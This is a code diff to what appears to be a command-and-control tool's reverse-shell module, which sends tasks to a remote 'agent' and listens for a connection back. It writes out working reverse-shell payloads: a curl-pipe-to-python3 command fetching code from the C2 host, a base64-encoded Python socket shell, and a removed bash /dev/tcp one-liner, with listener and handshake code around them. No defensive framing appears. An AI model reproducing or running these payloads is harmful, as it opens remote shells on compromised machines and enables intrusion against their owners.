@@ -27,14 +27,6 @@ def detect_ip():
         return "127.0.0.1"
 
 
-def get_free_port():
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.bind(("", 0))
-    port = s.getsockname()[1]
-    s.close()
-    return port
-
-
 def _set_winsize(fd, rows, cols):
     winsize = struct.pack("HHHH", rows, cols, 0, 0)
     fcntl.ioctl(fd, termios.TIOCSWINSZ, winsize)
@@ -132,7 +124,8 @@ def _listen_and_verify(srv, token, timeout=25):
     deadline = time.time() + timeout
     while time.time() < deadline:
         try:
-            srv.settimeout(max(1, deadline - time.time()))
+            remaining = max(0.5, deadline - time.time())
+            srv.settimeout(remaining)
             conn, addr = srv.accept()
             conn.settimeout(5)
             try:
@@ -145,59 +138,53 @@ def _listen_and_verify(srv, token, timeout=25):
             print(f"{Fore.YELLOW}[!] Ignored {addr} (bad handshake){Style.RESET_ALL}")
             conn.close()
         except socket.timeout:
-            return None, None
+            continue
     return None, None
 
 
 def revshell(manager, agent_id, c2_server):
     port = REVSHELL_PORT
     token = secrets.token_hex(8)
-    host = PUBLIC_HOST
 
     srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    srv.settimeout(5)
     try:
         srv.bind(("0.0.0.0", port))
-        srv.listen(5)
     except OSError:
-        # Port taken, try random
-        port = get_free_port()
-        host = detect_ip()
-        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        srv.bind(("0.0.0.0", port))
-        srv.listen(5)
-        print(f"{Fore.YELLOW}[!] Port {REVSHELL_PORT} busy, fallback to {host}:{port}{Style.RESET_ALL}")
+        srv.close()
+        print(f"{Fore.RED}[!] Port {port} in use{Style.RESET_ALL}")
+        return
+    srv.listen(5)
 
     print(f"{Fore.CYAN}[*] Listener on 0.0.0.0:{port}{Style.RESET_ALL}")
 
-    # Try Python reverse shell (base64-encoded, no quoting issues)
-    import base64
-    py_code = (
-        "import socket,os,subprocess\n"
-        f"s=socket.socket();s.settimeout(20)\n"
-        f"s.connect(('{host}',{port}))\n"
-        f"s.send(b'{token}\\n')\n"
-        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)\n"
-        "subprocess.call([os.environ.get('SHELL','/bin/sh')])\n"
-    )
-    b64 = base64.b64encode(py_code.encode()).decode()
-    py_payload = f"echo {b64} | base64 -d | python3"
-    _send_task(manager, agent_id, py_payload, f"Python shell → {host}:{port}")
+    # Send revshell via HTTP — agent fetches /revshell from C2 and pipes to python3
+    # No quoting issues, script has token + host pre-substituted
+    payload = f"curl -s https://{PUBLIC_HOST}/revshell | python3"
+    _send_task(manager, agent_id, payload, f"curl .../revshell | python3 → {PUBLIC_HOST}:{port}")
 
-    conn, addr = _listen_and_verify(srv, token, timeout=20)
+    conn, addr = _listen_and_verify(srv, token, timeout=25)
     srv.close()
 
     if not conn:
-        # Try bash /dev/tcp
-        bash_payload = f"bash -c 'exec 3<>/dev/tcp/{host}/{port}; echo {token} >&3; cat <&3 | /bin/sh -i >&3 2>&3'"
-        _send_task(manager, agent_id, bash_payload, f"bash /dev/tcp → {host}:{port}")
+        import base64
+        host_clean = PUBLIC_HOST
+        py_code = (
+            "import socket,os,subprocess\n"
+            f"s=socket.socket();s.settimeout(25)\n"
+            f"s.connect(('{host_clean}',{port}))\n"
+            f"s.send(b'{token}\\n')\n"
+            "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)\n"
+            "subprocess.call([os.environ.get('SHELL','/bin/sh')])\n"
+        )
+        b64 = base64.b64encode(py_code.encode()).decode()
+        fallback = f"echo {b64} | base64 -d | python3"
+        _send_task(manager, agent_id, fallback, f"base64 python → {PUBLIC_HOST}:{port}")
         srv2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         srv2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         srv2.bind(("0.0.0.0", port))
         srv2.listen(5)
-        conn, addr = _listen_and_verify(srv2, token, timeout=15)
+        conn, addr = _listen_and_verify(srv2, token, timeout=20)
         srv2.close()
 
     if conn:
